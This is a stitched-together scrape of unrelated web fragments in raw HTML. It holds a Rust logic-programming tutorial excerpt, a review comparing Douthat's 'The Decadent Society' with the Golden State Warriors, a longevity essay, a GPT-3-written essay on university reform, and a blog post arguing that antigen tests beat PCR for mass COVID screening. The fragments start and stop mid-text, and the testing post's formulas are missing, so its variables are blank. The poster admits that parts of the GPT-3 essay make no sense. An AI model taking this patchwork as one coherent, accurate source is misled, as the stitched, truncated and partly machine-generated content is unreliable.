    </span><span>pub fn </span><span>fork</span><span>(</span><span>mut </span><span>self</span><span>, </span><span>fork</span><span>: Rc&lt;dyn Fork&lt;T&gt;&gt;) -&gt; </span><span>Option</span><span>&lt;</span><span>Self</span><span>&gt;;
}

</span><span>pub trait </span><span>Fork</span><span>&lt;T&gt; {
    </span><span>fn </span><span>run</span><span>(</span><span>&amp;</span><span>self</span><span>, </span><span>state</span><span>: State&lt;T&gt;) -&gt; StateIter&lt;T&gt;;
}
</span></code></pre>
<p>Note that both functions take a <code>mut self</code> and return an <code>Option&lt;Self&gt;</code>. The <code>.unify(...)</code> function eagerly attempts to reconcile bindings with those already contained in the state. If unification fails, the entire state is now invalid. We can bail right away with <code>None</code> and avoid processing any additional updates. Used with the <code>?</code> try operator, this can actually be quite smooth.</p>
<pre><code><span>State::new()
    .</span><span>unify</span><span>(x, </span><span>1</span><span>)</span><span>? </span><span>// &lt;- returns Some(state)
    </span><span>.</span><span>unify</span><span>(x, </span><span>2</span><span>)</span><span>? </span><span>// &lt;- returns None
</span></code></pre>
<p>The simplest <code>Goal</code> that would use <code>Fork</code> is <code>Either</code>, where you'll get zero or more results states for both sides:</p>
<pre><code><span>let</span><span> goal </span><span>= </span><span>either</span><span>(
    </span><span>unify</span><span>(x, </span><span>1</span><span>),
    </span><span>unify</span><span>(x, </span><span>2</span><span>),
);
</span></code></pre>
<p>By deferring evaluation of the <code>Fork</code> objects, we do as much work to disprove as many goals as possible <em>before</em> we eventually split into an arbitrary number of result states.</p>
<p>The <code>Fork</code> trait's <code>.run(...)</code> is not invoked until we query for results. At that point, we recurse our way through the list of <code>Fork</code> items as a queue, branching out at each iteration.</p>
<pre><code><span>fn </span><span>iter_forks</span><span>(</span><span>mut </span><span>self</span><span>) -&gt; StateIter&lt;</span><span>'a</span><span>, D&gt; {
    </span><span>let</span><span> fork </span><span>= </span><span>self</span><span>.forks.</span><span>pop_front</span><span>();
    </span><span>match</span><span> fork {
        </span><span>None </span><span>=&gt; </span><span>Box</span><span>::new(</span><span>once</span><span>(</span><span>self</span><span>)),
        </span><span>Some</span><span>(fork) </span><span>=&gt; </span><span>Box</span><span>::new(fork.</span><span>run</span><span>(</span><span>self</span><span>).</span><span>flat_map</span><span>(State::iter_forks)),
    }
}
</span></code></pre>
<p>Note that <code>iter_forks(..)</code> does not clone the <code>State</code>. The struct that implements <code>Fork</code> <em>may</em> clone the <code>State</code> at the last moment, but only if actually needed.</p>
<p>In a nutshell:</p>
<ul>
<li><code>.unify(...)</code> eagerly converges, constraining the <code>State</code> into zero or one possible outcomes.</li>
<li><code>.fork(...)</code> lazily diverges, splitting a <code>State</code> into zero or more alternate possibilities.</li>
</ul>
<h2 id="typing-the-domain">Typing the Domain</h2>
<p><em>Statically typed</em> logic programming seems to be a small niche within the niche that is regular logic programming.<sup><a href="#typedlogic">3</a></sup></p>
<p>After a walking down a few dead ends, I settled on an approached based on procedural macros.</p>
<pre><code><span>domain! </span><span>{
    </span><span>pub</span><span> MyDomain {
        </span><span>i32</span><span>,
        </span><span>String
    </span><span>}
}
</span></code></pre>
<p>The <code>domain!</code> macro can create a struct with associated functions that enable it to store and retrieve collections of values compatible with a user defined domain <em>by type</em><sup><a href="#anymap">4</a></sup>. The generated struct looks (roughly) like this:</p>
<pre><code><span>pub struct </span><span>MyDomain </span><span>{
    </span><span>t0</span><span>: HashMap&lt;LVar&lt;</span><span>i32</span><span>&gt;, Val&lt;</span><span>i32</span><span>&gt;&gt;,
    </span><span>t1</span><span>: HashMap&lt;LVar&lt;</span><span>String</span><span>&gt;, Val&lt;</span><span>String</span><span>&gt;&gt;,
}
</span></code></pre>
<p>With pseudo-private<sup><a href="#privacy">5</a></sup> accessors that can be used to retreive the inner containers:</p>
<pre><code><span>impl</span><span>&lt;</span><span>'a</span><span>&gt; DomainType&lt;</span><span>'a</span><span>, </span><span>i32</span><span>&gt; </span><span>for </span><span>MyDomain </span><span>{
    </span><span>fn </span><span>values_as_ref</span><span>(</span><span>&amp;</span><span>self</span><span>) -&gt; </span><span>&amp;</span><span>HashMap&lt;LVar&lt;</span><span>i32</span><span>&gt;, Val&lt;</span><span>i32</span><span>&gt;&gt; {
        </span><span>&amp;</span><span>self</span><span>.t0
    }
    </span><span>fn </span><span>values_as_mut</span><span>(</span><span>&amp;</span><span>mut </span><span>self</span><span>) -&gt; </span><span>&amp;</span><span>mut </span><span>HashMap&lt;LVar&lt;</span><span>i32</span><span>&gt;, Val&lt;</span><span>i32</span><span>&gt;&gt; {
        </span><span>&amp;</span><span>mut </span><span>self</span><span>.t0
    }
}
</span></code></pre>
<p>The <code>State</code> struct is now parameterized with a <code>Domain</code> type, to which it delegates management of the individual <code>Val&lt;T&gt;</code> containers (some of this is actually spread into other traits/impls, but this is essentially what happens):</p>
<pre><code><span>impl </span><span>&lt;D: Domain&gt; </span><span>State</span><span>&lt;D&gt; {
    </span><span>pub fn </span><span>resolve_val</span><span>&lt;T&gt;(</span><span>&amp;</span><span>self</span><span>, </span><span>val</span><span>: </span><span>&amp;</span><span>Val&lt;T&gt;) -&gt; </span><span>&amp;</span><span>Val&lt;T&gt;
    </span><span>where</span><span>
        D: DomainType&lt;T&gt;,
    {
        </span><span>match</span><span> val {
            Val::Var(var) </span><span>=&gt; </span><span>{
                </span><span>let</span><span> resolved </span><span>= </span><span>self</span><span>.domain.</span><span>values_as_ref</span><span>().</span><span>get</span><span>(var);
                </span><span>match</span><span> resolved {
                    </span><span>// We found another Var, try to resolve deeper
                    </span><span>Some</span><span>(found) </span><span>=&gt; </span><span>self</span><span>.</span><span>resolve_val</span><span>(found),
                    </span><span>// We didn't find a binding, return the Var
                    </span><span>None </span><span>=&gt;</span><span> val,
                }
            }
            </span><span>// This isn't a Var, just return it
</span><span>            value </span><span>=&gt;</span><span> value,
        }
    }
}
</span></code></pre>
<p>Goals are also parameterized by <code>Domain</code>:</p>
<pre><code><span>// Compiles!
</span><span>let</span><span> goal </span><span>= </span><span>Goal&lt;MyDomain&gt; </span><span>= </span><span>unify</span><span>(x, </span><span>1</span><span>);
</span><span>// Does not compile :)
</span><span>let</span><span> goal </span><span>= </span><span>Goal&lt;MyDomain&gt; </span><span>= </span><span>unify</span><span>(x, </span><span>vec!</span><span>[</span><span>1</span><span>, </span><span>2</span><span>]);
</span></code></pre>
<p>While the macro approach feels a bit idiosyncratic, it does have a few really nice properties. Most notably: explicitly defining all of the types that should be valid in the <em>logic</em> domain greatly increases the helpfulness of compiler errors.</p>

<li>In Rust (as elsewhere), pain is an indication that you may want to reconsider your approach.</li>
<li>Studying prior art is important, but take its original context into account to avoid imitating badly. A different context might require different choices.</li>

<h4 id="decadencedecadenceallisdecadence">Decadence, decadence! All is decadence.</h4>
<p><span>R</span>oss Douthat’s Solomonic cry rings throughout his recent book, <em>The Decadent Society</em>. Growth, economic and otherwise, has flattened, and we have lost our vitality and innovative vigor in all but a few sectors of society, he claims. The cracks are beginning to widen, and the best our institutions can do is mine our own foundations for ever-diminishing nuggets of recursive experience, for those glinting and highly commodified short-term distractions packaged as individual empowerment.</p>
<p>Decadence by Douthat’s definition refers to economic stagnation, institutional decay, and cultural and intellectual exhaustion, all despite a high level of material prosperity and technological development. From our entertainment to our politics to our technology, Douthat argues that the developed world has lapsed into a spiral of decadent decline. This is caused by  our relative prosperity—stagnation and decay are often a direct consequence of significant previous development and progress. Our decadent society is, by definition, a victim of its own significant material success.</p>
<p>Before total disillusionment comes the long decay, the foul rot masked by the too-sweet fragrance of decadence. Such was the state of empires long past, and such is the case of our society present, stilted and unable to muster the innovation and optimism necessary to imagine a properly vibrant, worthy future. So much displays this decay, from our stunted intellectual climate with its teapot tempests relitigating the animating arguments of the past, to our failure to tell new stories to ourselves, to our increasingly tech-integrated existence that demands and swallows our attention and hollows out our sense of a meaningful life.</p>
<p>Douthat’s book is an attempt to weave the social sciences together with observations on our intellectual climate, our popular culture, our religious moment, and our technological pastimes. We are a people in decline, which is made all the worse for the fact that we hardly even realize it.</p>
<p><em>The Decadent Society</em> opens with a contention: The optimism and innovation that powered our past selves, that carried us through the World Wars and enabled a Space Age that energized and inspired our society, has vanished. Once, we put men on the moon. Now, boot prints on Jupiter is not even seen as an absurd notion; it is, worse still, an unconsidered one. Our ancestors looked up and saw the stars and we look down to see ourselves reflected in our screens. Impossibly capable screens, but ones not quite fulfilling the promise of our once-imagined future, and ones that seem to leave us <em>feeling</em> worse off, whether or not we actually are. Expanding our physical horizons has been abandoned; space left unexplored for the sake of cyberspace. That one is real and the other, while not unreal, certainly feels so, goes a long way to informing the discontentment of our age.</p>
<p>Douthat examines a representative example from Hollywood, one of our few remaining cultural tentpoles: the first Star Wars films were revolutionary, the latest reboots are stilted yet profitable nostalgia ploys that “give up on originality entirely and just make not a pastiche of classic films but <em>pastiches of the original pastiche</em>.” Even in our stories of vast and unending universes we are stuck exploring the same rutted terrain as our fathers, but with none of the animating originality or imagination. In too many ways we are not building upon our foundations, we are cannibalizing them. Can you not feel us teetering?</p>
<p>Douthat contends that “From the academic heights to popular bestsellers, from Christian theology to secular fashion, from political theory to pop music, a range of cultural forms and intellectual pursuits have been stuck for decades in a pattern of recurrence—of [cultural critic Jacques] Barzun’s ‘repetition and frustration’ and ‘boredom and fatigue.’”</p>
<p>Repetition and frustration, boredom and fatigue.</p>
<p>Familiar feelings for a basketball fan of the past few years. Because if Douthat had extended his proofs beyond and into the world of sports, if he were to train his lens of decadence on the NBA, he could not have come up with a more fitting example of this paradigm in action than the 2017-2019 Golden State Warriors. Unwittingly embodying Douthat’s thesis, Ethan Sherwood Strauss’s <em>The Victory Machine</em> details the decadence and decline of the most modern, most dominant, and most disparaged of all NBA superteams.</p>
<h4 id="thevictorymachine">The Victory Machine</h4>
<p>“There are no rules, but you break them at your own peril.”</p>
<p>The <em>Victory Machine</em> opens with a coup. The year is 2010. Strauss relates the above quote from Peter Guber, now co-governor of the Golden State Warriors, as he describes the circumstances of how he and fellow co-governor Joe Lacob <a href="https://theathletic.com/441064/2018/07/23/untold-story-how-lacob-and-guber-won-the-warriors-and-ellison-lost/">came to control the team</a>. Through a cunning and risky bit of negotiating that disregarded all convention, two business titans managed to outwit their much-richer competition to buy the franchise, based at the time in Oakland, California. This was before the Warriors had truly lived up to their gilded name, back when they were still one of the league’s lesser teams.</p>
<p>But then.</p>
<p>The next decade brought them three championships and perhaps the greatest collection of NBA talent ever assembled; brought the Warriors from scrappy underdogs to respected champions to an undisputed, yet despised, superteam as they piled hubris atop of dominance.</p>
<p>Fittingly, this team is located in the geographic heart of American decadence itself: Silicon Valley, where the tech bros and entrepreneurial optimists live large. It was they who built this modern, analytics-focused team. Smart drafting, savvy hires, lots of luck, and the Warriors became a young, fun, exuberant team on the rise. And key to this story of transformation, from a perpetual loser to an undisputed winner to an all-time great team, was the addition of MVP small forward Kevin Durant.</p>
<p>Douthat begins his book describing the moon landing—“The peak of human accomplishment and daring”—but he could as easily be talking about the Warrior’s point guard Stephen Curry on the break: pulling up from deep, inconceivably, galactically deep, pushing analytics to its outer limits. Douthat writes that the Apollo Landing proved that, “the efficiency and techno-optimism of Eisenhower-era America. . . represented a kind of mystical, dizzy, Age of Aquarius moment in its own right.” Efficient, mystical, and dizzying describes the ascendant Warriors just as well. Their 2014-2016 supernova squad pressed frontiers and shattered old-head assumptions. Who remembers “<a href="http://www.basketballinsiders.com/the-ongoing-debate-about-jump-shooting-teams/">Jump-shooting teams don’t win championships</a>?”</p>
<p>The space age was “the culmination of the [1960’s] revolutionary promise”, but did it ever elicit not one but <a href="https://www.youtube.com/watch?v=GEMVGHoenXM">two BANGS! from Mike Breen</a>? This was when the Warriors were fun and ascendant, haughty and graceless, preening and electric. And, in 2015, led by the revolutionary troika of Steph Curry, Klay Thompson, and Draymond Green, the Warriors won the NBA title. In 2016 they broke the NBA single season wins record, which was previously held by Michael Jordan’s Chicago Bulls, by going 73-9 in the regular season.</p>
<p>Improbably, though, they promptly lost to LeBron James and the Cleveland Cavaliers in the <a href="https://www.youtube.com/watch?v=iDCegwpnlbM">2016 NBA Finals</a>. So, licking their wounds and their pride they retooled that offseason: the best regular season team in basketball signed Durant, arguably a top-two player in the game (and one they had bested in an excruciatingly tight Western Conference finals that postseason), away from the Oklahoma City Thunder to form an unparalleled collection of talent.</p>
<p>Durant is one of the most talented scorers the world has ever seen: all skin and bone and length and lethality—pure, silky, deadly ability. From the outside looking in, though, the Warriors had hoarded more than an embarrassment of riches. It seemed unfair. Fans, media, and other players alike excoriated the move. Durant had lost to this team in the playoffs, and instead of taking them on as a challenge to overcome, he jumped on board to fight by his rival’s side.</p>
<p>The Warriors were rightfully ecstatic. As an organization they had taken to seeing themselves as “<a href="https://www.nbcsports.com/bayarea/warriors/joe-lacob-warriors-light-years-ahead-rest-nba">light-years ahead</a>” of their competition, and they were living up to their own stratospheric self-regard. By most estimations they were untouchable, an unreachably superior foe. On the reaction to the move, Strauss relates, “the idea of Kevin Durant joining the Warriors, though financially possible, was so inconceivable to so many. It was just too much, too decadent.”</p>
<p>All is decadence.</p>
<p>In fact, much of Strauss’s <a href="https://theathletic.com/author/ethan-strauss/">writings for The Athletic</a> are cozy correlates to Douthat’s. Outlining the extraordinary yet ultimately unreal paper tigers of Silicon Valley success, Douthat writes that “Twenty-first century growth and innovation are not at all what we were promised they would be,” and, “In a decadent economy, the supposed cutting edge of capitalism is increasingly defined by lets-pretendism—by technologies that have <em>almost</em> arrived, business models that are <em>on their way</em> to profitability, by runways that go on and go on without ever achieving liftoff”—analysis that strongly echoes Strauss’s own assessment of what’s wrong with the NBA.</p>
<p>“It might sound like sacrilege,” Strauss wrote in <a href="https://theathletic.com/1276780/2019/10/10/the-nbas-dwindling-viewership-and-precarious-outreach-plans/">an October 2019 column</a>, “but it’s more than likely that the NBA is losing domestic popularity now and in the near term, despite its ever-sold narrative of a perpetual ascendance. Yes, the NBA is young, steeped in the social media zeitgeist and theoretically primed to take over when those other dusty sports die out. No, this dynamic isn’t yet resulting in demonstrable viewership growth in America.”</p>
<p>Douthat and Strauss’s sacrilegious ire is aimed at these “ever-sold narratives of perpetual ascendance” that, while comforting to the teller, are ultimately misleading, furthering our wandering descent while we smile and walk on, all the while unaware.</p>
<p>Strauss consistently critiques the NBA by drawing attention to its particular …</p></div></div>

It is the most important thing, and yet, when we start planning, we neglect it so much.</p><p id="viewer-dskj9">We are somehow stuck in the culture of thinking about health only when things go wrong.</p><p id="viewer-54at8"><strong>How could we possibly achieve the optimal outcome on a complex system, without any organization or planning?</strong></p><p id="viewer-cngl8">Schools don’t teach young children about their health. We go to the doctor when we’re sick. As soon as we recover, health problems are a long-forgotten memory. The reactive approach to health is the root of the problem.</p><p id="viewer-849ss"><strong>We have to be proactive.</strong> We need to start thinking about the problem most likely to trouble us decades in advance. You don’t run a company without checking the key metrics. Generally, you don’t do things without any thinking, especially if you are aware of the consequences of those things.</p><p id="viewer-8aqne">Longevity science is clear:</p><blockquote id="viewer-6ajen"><p>If you want to live longer and healthier, you should focus on delaying the onset of chronic diseases instead of trying to live longer once you have the disease.</p></blockquote><p id="viewer-b0gka">It’s not to sound alarmist or over-anxious about the problems of the future, but if you want to avoid chronic diseases, you have to find early signs of problems and address them quickly. It is very much possible! If you take a closer look at how your body reacts to certain foods, activities, situations, you might realize that in specific areas, you can implement life-saving changes (even if the life you’ll be saving is that of a 70-year old you).</p><p id="viewer-arcba">Approaching health with the framework: “track, understand, act” would solve most of the preventable problems. Our reactive approach to health was developed during centuries when no technology was available. Now we have new tools, but we continue having the old mindset.</p><p id="viewer-5j2el">Of course, taking a proactive approach to longevity isn’t easy. First, there is what I call the “<strong>Longevity Paradox.”</strong> When everything goes well for you, you don’t want to think of any bad scenarios. You don’t want to learn that your chances of developing cancer are high or that <a href="https://medium.com/lifetizr/what-i-learned-from-wearing-a-continuous-glucose-monitor-as-a-non-diabetic-bca4c3a9ce28" target="_blank" rel="noopener">your metabolism is far from optimal</a>. <strong>But, like in everything with life, when you run away from problems, procrastinate, the problems can pile up and become even worse.</strong></p><p id="viewer-2g08p">
The other challenge is that this strategy is <strong>very expensive</strong>. Right now, taking the preventive approach to health costs a lot of money, and a lot of time.
Why? Because you have to pay for all the gadgets and plans yourself plus you have to organize it yourself. <strong>Insurances and payers aren’t aligned with you when it comes to longevity.</strong> That’s the root of the problem.</p><p id="viewer-slb8">
<strong>The incentives aren’t aligned.</strong></p><p id="viewer-332ej">
The problem is that insurance companies have short-term thinking. Imagine a scenario: a thirty-year-old woman that has a two-year insurance plan. Thirty years away from developing a serious health condition. Likely to move around the world, live in different cities or countries because of job, love, whatever.</p><p id="viewer-d2t1f">
Insurance companies will not have any interest in thinking about her health problems when she’ll be older.</p><p id="viewer-2s9el">Everyone will agree that prevention is the best medicine. But very few will pay for it. That’s <strong>why longevity is as much an economic problem as it is a scientific problem.</strong> If we want to make it to 100 years old (or more) in great shape, science and money must find common ground.</p><p id="viewer-foi7k">
Could more interest in the longevity &amp; health optimization field be a silver lining to the COVID19 pandemic?</p><p id="viewer-d562b">
That’s possible. Health, biotech, pharmaceuticals, and life sciences are sectors that are <a href="https://yourstory.com/2020/05/coronavirus-vc-funding-paused-market-new-sectors-investing-model" target="_blank" rel="noopener">hugely attractive to investors</a> due to their applicability in the current environment.
The current crisis defines a significant change in business opportunities. John Luttig <a href="https://luttig.substack.com/p/when-tailwinds-vanish" target="_blank" rel="noopener">writes</a>:</p><blockquote id="viewer-b1uqj"><p>
The Internet tailwinds that propelled Silicon Valley’s meteoric growth for decades are stalling out. The ripple effects will jolt the tech industry.</p></blockquote><p id="viewer-8q7s5">
It may create the perfect shot for founders working on longevity and life extension:

</p><blockquote id="viewer-eggov"><p>Founders may seize this moment to build new tools to better understand operational investments, create the financial layer of the Internet, or look beyond the Internet to build new platforms in biotech or energy.</p></blockquote><p id="viewer-840el">
There appears to be a shift in the business side of life extension, but, most importantly, there is a mindset shift.</p><p id="viewer-drah3">
As <a href="https://medium.com/u/f5a2e83d6d8f?source=post_page-----fdd22ba015e4----------------------" target="_blank" rel="noopener">Balaji S. Srinivasan</a> <a href="https://podcasts.google.com/feed/aHR0cHM6Ly9yc3MuYXJ0MTkuY29tL3RoZS1wb3J0YWw=/episode/Z2lkOi8vYXJ0MTktZXBpc29kZS1sb2NhdG9yL1YwL19yMzZaM3NYWndUbTI5WUs1Mk1xdWxVYUZDUnFvY3VzUl80WFg4dEFKa3M=" target="_blank" rel="noopener">put it</a> on The Portal with Eric Weinstein, people got used to checking health dashboards every day. Health is at the center of everything since February 2020. In articles, discussions, social media, health is everywhere. The increased importance we give to health in light of the pandemic may contribute to putting health among the central features of our societies.</p><p id="viewer-65ube">
Wearables also gained a lot of traction during these months. For example, the Oura Ring <a href="https://ouraring.com/wvu-rockefeller-neuroscience-institute-predict-covid-19-related-symptoms-up-to-three-days-in-advance" target="_blank" rel="noopener">was used</a> to predict COVID-19 related symptoms up to three days in advance. The future might give even more importance to diagnostic-grade wearables.</p><p id="viewer-46sjq">With no sign of the pandemic being completely eradicated soon, this massive interest in health &amp; biotech may continue for the years to come. According to the best scientists in the field, radical life extension is much more achievable than people think.</p><p id="viewer-d82if">For example, <a href="https://www.biorxiv.org/content/10.1101/2020.05.07.082917v1" target="_blank" rel="noopener">this</a> recent pre-print study looks into the possibilities of reversing the age of rats. David Sinclair, the author of <a href="https://lifespanbook.com/" target="_blank" rel="noopener">Lifespan</a>, explains it in <a href="https://twitter.com/davidasinclair/status/1259912928695857152?s=20" target="_blank" rel="noopener"><u>this</u></a> thread, to help us better understand the implications of such findings.</p><p id="viewer-cnaph">The COVID crisis showed us how much of our assumptions were wrong. It showed us how bad things could get without appropriate planning. It showed us how catastrophic not investing in prevention can be.</p><p id="viewer-7penq"><strong>It’s the perfect opportunity to correct some of these problems and use this paradigm shift to 10x the speed of innovation in fields that matter.</strong> <a href="https://www.theatlantic.com/science/archive/2018/11/diminishing-returns-science/575665/" target="_blank" rel="noopener">Progress and innovation are slowing down</a>, and these unprecedented challenges call for a strong reaction. As Marc Andreessen put it, “it’s<a href="https://a16z.com/2020/04/18/its-time-to-build/" target="_blank" rel="noopener"> time to build</a>.”</p><p id="viewer-5gl4i">Increasing healthspan &amp; lifespan will require a multidisciplinary effort from discovery and business to distribution. For now, we already have a lot of technologies we could use better to help people increase their healthspan &amp; lifespan. In parallel with trying to extend the human lifespan radically, we can focus on helping people optimize their health to live to 100 in great shape.

  <p>(please read through to the end)</p>

<p><strong>Universities prepare students for a career in research, not for an actual job. We need to reform higher education in order to make graduates employable on the private market. These are some of my suggestions:</strong></p>

<ol>
  <li>Free higher education for students of a state university so that they may accumulate new knowledge without spending unnecessary money on tuition fees.</li>
  <li>Improve the quality of the education at state universities by forcing faculties to compete for students. Right now, the number of places at a university is fixed and departments do not need to be more attractive than others in order to attract students.</li>
  <li>Offer students the freedom to enroll in more practical modules important for the labor market, like computer programming classes, office management, and team management.</li>
  <li>Attempt to connect universities with industry or private organizations. IIT (Indian Institute of Technology) is successful in this field. This may be due to the fact that they grant patents to industry partners and share the profits with them. This is good for all parties and enriches the public sector.</li>
  <li>Students of private universities receive government funding. This support is available regardless of the number of alumni from a university, thus offering smaller private universities the possibility to participate in the program.</li>
  <li>Students of public universities divide their funding on research and for the exchange of information and new knowledge, which they then may share with society. This publication of research results is important in order to foster the competitiveness of market economy.</li>
  <li>Government funding may be provided for master’s degrees in order to offer students more study places.</li>
</ol>

<p>In conclusion, market-based reforms are needed in order to create new opportunities and prepare highly trained students for the private market. The quality of institutions will thus be on the rise, most students planning on an academic career will find employment, and salaries will be fulfilled.</p>

<p>-</p>

<p>The above essay was written by GPT-3, the current state-of-the-art NLP algorithm developed by OpenAI. I fed it the headline and the introduction (in bold), the rest was all algorithm - I deleted some sentences and added punctuation but didn’t write a single word of it.</p>

<p>Some of it doesn’t make any sense of course, but as an idea generator I think this technology could be extremely helpful. Imagine how hard it will be for teachers to grade papers written by this thing though.</p>

<p>And imagine what it will do to your job.</p>

  <p><span>15 Jul 2020</span></p><p><em>[Disclaimer: I am not an epidemiologist. The models presented here make simplifying assumptions.]</em></p>

<p>If we want to reopen schools and offices, we need to do so safely. According to Nobel Prize winning economist Paul Romer, the best way is with <a href="https://schools.paulromer.net/">frequent</a> and <a href="https://paulromer.net/faqs-on-virus-tests-in-schools/">regular</a> testing of asymptomatic students and employees. Catching infections early can stop the spread before it starts.</p>

<p>Much of the discussion about testing has centered on <a href="https://www.npr.org/sections/health-shots/2020/05/01/847368012/how-reliable-are-covid-19-tests-depends-which-one-you-mean">PCR</a>, a relatively expensive method that is vulnerable to <a href="https://www.npr.org/2020/05/28/863558750/coronavirus-testing-machines-are-latest-bottleneck-in-troubled-supply-chain">multiple</a> <a href="https://www.latimes.com/california/story/2020-07-12/california-fail-coronavirus-testing-covid-start">supply chain</a> bottlenecks and is generally <a href="https://www.technologyreview.com/2020/05/06/1001150/podcast-covid-19-testing-bottleneck/">hard to scale up</a>. Test samples must be sent to a central laboratory and then passed through expensive machines, a process that is currently taking 5-7 days, and in some places as high as <a href="https://twitter.com/SFCovidTestWait/status/1283122098714693633">10-13 days</a>. Efforts are being made to speed this up via pooling, but the operational complexity of PCR makes it likely that there will always be at least a few days of delay.</p>

<p>A less talked about alternative to PCR is called <em><a href="https://www.sciencemag.org/news/2020/05/coronavirus-antigen-tests-quick-and-cheap-too-often-wrong">antigen tests</a></em>. These tests are much cheaper than PCR, with estimates ranging between <a href="https://www.sciencemag.org/news/2020/05/coronavirus-antigen-tests-quick-and-cheap-too-often-wrong">$1</a> and <a href="https://www.technologyreview.com/2020/04/24/1000486/antigen-testing-could-faster-cheaper-diagnose-covid-19-coronavirus/">$10</a> per test, compared to <a href="https://www.technologyreview.com/2020/04/24/1000486/antigen-testing-could-faster-cheaper-diagnose-covid-19-coronavirus/">$50</a> for PCR. More importantly, they can return results in just <a href="https://www.cdc.gov/flu/professionals/diagnosis/clinician_guidance_ridt.htm">15 minutes</a>, without any need to send samples to a central lab.</p>

<p>Since antigen tests are far cheaper and faster than PCR, why are we not massively investing in them?</p>

<p>The usual answer is test accuracy. SARS-CoV-2 antigen tests have a sensitivity of about <a href="https://www.nytimes.com/2020/07/06/health/fast-coronavirus-tests.html">85-90%</a>, meaning that only 85%-90% of true cases will be detected as such. And those are optimistic estimates reported by test manufacturers. For influenza, the CDC reports that antigen tests have a sensitivity of <a href="https://www.cdc.gov/flu/professionals/diagnosis/clinician_guidance_ridt.htm">50-70%</a>. This is much lower than PCR tests, which have a sensitivity as high at <a href="https://www.medrxiv.org/content/10.1101/2020.05.26.20112565v1.full.pdf">98%</a>.</p>

<p>Some doctors view the low sensitivity as an insurmountable hurdle. “It won’t work”, <a href="https://www.technologyreview.com/2020/04/24/1000486/antigen-testing-could-faster-cheaper-diagnose-covid-19-coronavirus/">said</a> one doctor. “A misdiagnosis is worse than no diagnosis”, <a href="https://www.sciencemag.org/news/2020/05/coronavirus-antigen-tests-quick-and-cheap-too-often-wrong">said</a> another.</p>

<p>I am not sure I agree, at least when it comes to mass testing of asymptomatic individuals. In this blog post I will show, via both simulations and analytical arguments, that the low sensitivity of antigen tests is a much better problem to have than the long delay of a PCR test.</p>

<h3 id="simulations">Simulations</h3>

<p>To test this hypothesis, I built an <a href="https://github.com/csaid/covid_model_with_testing/blob/master/SIR%20model%20with%20testing.ipynb">agent-based SIR model</a> that includes testing and quarantining. I make the following key assumptions:</p>

<ul>
  <li>Population of 200 students</li>
  <li>Using a rotation system, each student is tested once every K days.</li>
  <li>Students go into a 14 day quarantine if they get positive test results.</li>
  <li>In addition to intra-school infections, each student has a chance of getting infected by someone outside the population.</li>
</ul>

<p>I <a href="https://github.com/csaid/covid_model_with_testing/blob/master/SIR%20model%20with%20testing.ipynb">simulated</a> two different scenarios.</p>

<ul>
  <li>Regular PCR testing (sensitivity of 98%, testing delay of 5 days)</li>
  <li>Regular antigen testing (sensitivity of 75%, no testing delay)</li>
</ul>

<p>For comparison, I also modeled a “best case scenario”, where no intra-school infections occur, and a “worst case scenario”, where there is no testing or quarantining at all.</p>

<p>Assuming that each student is tested once every 4 days, I find that the cumulative number of infections is far lower if we do regular antigen testing than if we do regular PCR testing.</p>

<p><img src="https://chris-said.io/assets/2020_antigen_testing/fig_test_every_4_days.png">
</p>


<p>If we change the frequency of testing to once every day, antigen testing is able to achieve close to best case results, with almost no intra-school infections. Meanwhile, daily PCR testing still results in a large number of infections.</p>

<p><img src="https://chris-said.io/assets/2020_antigen_testing/fig_test_every_1_day.png">
</p>


<p>This seems very important. <em>Not only are antigen tests cheaper than PCR, they are also more effective in a mass testing regime.</em> Further simulations in my <a href="https://github.com/csaid/covid_model_with_testing/blob/master/SIR%20model%20with%20testing.ipynb">notebook</a> show that the superiority of antigen tests is maintained even for much lower sensitivities.</p>

<h3 id="why-is-low-sensitivity-better-than-slowness">Why is low sensitivity better than slowness?</h3>

<p>Maybe you don’t believe my simulations, so here’s an analytical argument instead. Imagine you test people every day using a 75% sensitive antigen test. If someone is infected, they will probably find out immediately. There is a smallish chance they will first find out after a day, and a very small chance it will take longer than that. On average they will find out after 0.33 days, which is much faster than a typical PCR test. In general, for a sensitivity of , daily antigen test participants will find out after an average of  days, where  is defined as:</p>



<p>which converges to</p>



<p>For any reasonable value of ,  will be quite low. Here’s a striking example. If you test people every day, a test with 50% sensitivity and no delay is equivalent to a test with 100% sensitivity and a 1-day delay!</p>

<p>This analysis assumes that  is fixed across time and individuals, an assumption I’ll address in the FAQ, below.</p>

<h3 id="faq">FAQ:</h3>

<p><strong>Q:</strong> <em>What is your main conclusion from this analysis?</em>
<br> <strong>A:</strong> For mass testing of asymptomatic individuals in schools and offices, antigen tests are cheaper and more effective than PCR tests.</p>

<p><strong>Q:</strong> <em>Have other people come to this conclusion?</em>
<br> <strong>A:</strong> Yes. After writing this blog post, I came across two recent pre-prints.</p>
<ul>
  <li><a href="https://www.medrxiv.org/content/10.1101/2020.06.22.20136309v2.full.pdf">Larremore et al.</a> shows that sensitivity is less important than testing delays. It comes with a wonderful <a href="https://larremorelab.github.io/covid-calculator3">interactive calculator</a>.</li>
  <li><a href="https://www.medrxiv.org/content/10.1101/2020.07.06.20147702v1.full.pdf">Paltiel et al.</a> show that sensitivity is less important than test frequency.</li>
</ul>

<p><strong>Q:</strong> <em>Are you arguing that antigen tests should always replace PCR?</em>
<br> <strong>A:</strong> No, I’m only suggesting it for mass testing of asymptomatic individuals. If a symptomatic person comes into a doctor’s office a PCR test would make sense, since sensitivity becomes more important and cost becomes less important.</p>

<p><strong>Q:</strong> <em>What if the antigen test has a much lower sensitivity for certain individuals, who will therefore remain undetected?</em>
<br> <strong>A:</strong> Low sensitivity for these individuals is <a href="https://www.sciencedirect.com/science/article/abs/pii/S138665321000106X">likely due to low viral load</a>, which most researchers believe means they will not be very infectious. That said, if would be really good if we could get more research on this, since it’s an important question.</p>

<p><strong>Q:</strong> <em>What if the sensitivity of the antigen test is especially low at the start of infection?</em>
<br> <strong>A:</strong> Another good question. As with the previous answer, this period of low sensitivity would likely be to due low viral load, when the individual is less infectious. Furthermore, the period where PCR tests can detect the virus while antigen tests cannot is <a href="https://www.medrxiv.org/content/10.1101/2020.06.22.20136309v2.full.pdf">probably only 24 hours</a>. But <em>even if</em> we assume the individual is just as infectious during this early period, the antigen test still remains superior. To estimate this, I ran simulations where antigen tests were completely ineffective for the first two days of infection, a conservative assumption. Even with this conservative constraint, and even assuming the individuals are fully infectious during this period, antigen tests still outperformed PCR.</p>

<p><img src="https://chris-said.io/assets/2020_antigen_testing/fig_test_every_1_day_delayed_detection.png">
</p>


<p><strong>Q:</strong> <em>What if the false negatives cause riskier behavior?</em>
